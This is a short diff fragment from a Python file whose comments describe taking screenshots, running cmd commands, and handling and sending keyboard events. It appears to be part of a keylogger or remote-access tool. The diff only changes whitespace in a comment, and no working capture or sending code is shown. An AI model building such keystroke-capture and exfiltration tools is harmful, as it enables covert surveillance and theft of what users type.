@@ -28,7 +28,7 @@ def jietu():
 	#获取截图
 def cmd():
 	pass
-	#cmd命令
+	#cmd命令 
 #键盘事件处理，并且发送
 def onKeyboardEvent(event):
     global s
